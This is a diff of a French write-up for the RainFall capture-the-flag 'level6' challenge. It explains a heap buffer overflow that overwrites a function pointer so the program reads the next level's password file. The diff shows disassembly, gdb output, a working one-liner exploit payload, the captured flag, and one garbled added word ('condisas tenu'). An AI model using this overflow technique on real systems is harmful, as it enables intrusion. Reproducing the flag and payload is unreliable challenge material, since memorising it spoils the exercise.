@@ -2,7 +2,6 @@
 
 On lance le binaire sans arguments il segfault, on le relance avec un argument
 il nous print "Nope".
-
 level6@RainFall:~$ objdump -d level6
 
 08048454 <n>:
@@ -20,7 +19,7 @@ le verifier lorsque l'on gdb celui-ci.
 (gdb) x/s 0x80485b0
 0x80485b0:	 "/bin/cat /home/user/level7/.pass"
 
-Et celle-ci effectue un cat sur le fichier dont nous cherchons le contenu..
+Et celle-ci effectue un cat sur le fichier dont nous cherchons le condisas tenu..
 
    0x080484d0 <+84>:	call   *%eax
 
@@ -36,13 +35,18 @@ nous affiche le fameux "Nope".
 Nous allons utilise la faille presente dans le programe level6, qui ne fais
 aucune verification concernant la taille des donnees recu par malloc avant
 l'appel a strcpy, ce qui va nous permettre le buffer overflow et l'appel a la
-fonction <n> plutot que l'appel a la fonction <m>
+fonction <n> plutot que l'appel a la fonction <m>.
+En effet malloc alloue dans un premier temps 64 octets pour notre stdin, puis
+dans un second temps 4 octets pour le pointeur sur la fonction <m>.
 
+Nous recuperons l'offset qui est de 72:
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 
-Nous recuperons l'offset qui est de 72, nous n'avons plus qu'a modifier
-l'adresse contenu dans eax, par celle de la fonction <n> pour pouvoir recuperer
-le flag.
+72, car malloc alloue 64 octets dans un premier temps, auquel on ajoute les 8
+octets correspondant au "boundary tag" grossierement parlant l'etiquette de
+notre malloc. Puis nos 4 octets pour remplacer l'adresse de notre fonction <m>
+par celle desiree. Nous n'allons plus qu'a creer notre script et lancer le tout
+
 
 level6@RainFall:~$ ./level6 $(python -c 'print 72*"A"+"\x54\x84\x04\x08"')
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
